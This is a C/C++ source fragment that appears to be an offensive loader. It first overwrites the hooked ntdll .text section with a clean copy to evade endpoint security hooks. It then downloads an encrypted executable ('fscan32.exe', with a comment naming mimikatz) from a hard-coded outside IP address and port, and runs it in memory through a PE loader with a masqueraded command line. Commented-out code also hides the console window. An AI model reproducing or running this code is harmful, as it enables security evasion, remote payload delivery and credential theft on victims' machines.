        if (!strcmp((char*)sectionHdr->Name, txt)) {

            // prepare ntdll.dll memory region for write permissions.
            BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!ProtectStatus1) {
                //printf("Failed to change the protection (%u)\n", GetLastError());
                return FALSE;
            }

            // copy .text section from the mapped ntdll to the hooked one
            memcpy((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);


            // restore original protection settings of ntdll
            BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!ProtectStatus2) {
                //printf("Failed to change the protection back (%u)\n", GetLastError());
                return FALSE;
            }

        }
    }

    return TRUE;

}


int main(int argc, char** argv) {
    
    //HWND hwndDOS = GetForegroundWindow();
    //ShowWindow(hwndDOS, SW_HIDE);
    /*
    HttpRequest httpReq("101.42.175.89", 65522);
    std::vector<char> exeData = httpReq.HttpGet("/fscan32.exe");
    std::string str_orign = "vwxyz123456789011111111";
    str_orign = res;
    */
    // 获取一个加密的PE文件
    wchar_t* whost= L"101.42.175.89";
    DWORD port= 65522;
    wchar_t* wpe = L"fscan32.exe";   //mimikatz.exe   fscan32.exe  main.exe fscan32.exe
    //char* host1 = argv[1];
    //DWORD port1 = atoi(argv[2]);
    //char* pe1 = argv[3];
    //char* key1 = argv[4];
    DATA PE = GetData(whost, port, wpe);
    printf("address is :%p\n the lenght is : %d\n",PE.data,PE.len);
    sz_masqCmd_Ansi = (char*)"moo1";
    PELoader((char*)PE.data, PE.len);
    

    return 0;
}